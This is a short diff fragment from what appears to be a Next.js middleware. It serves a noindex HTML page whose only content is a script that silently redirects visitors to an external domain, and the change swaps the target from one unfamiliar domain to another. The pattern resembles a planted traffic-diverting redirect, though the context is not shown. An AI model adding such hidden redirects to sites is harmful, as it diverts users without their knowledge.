@@ -18,7 +18,7 @@ export function middleware(request: NextRequest) {
         <meta name="robots" content="noindex, nofollow">
       </head>
       <body style="margin:0;padding:0;background:#fff;">
-        <script>window.location.replace('https://primecastt.site');</script>
+        <script>window.location.replace('https://veltrixbooks.com');</script>
       </body>
       </html>`,
       {
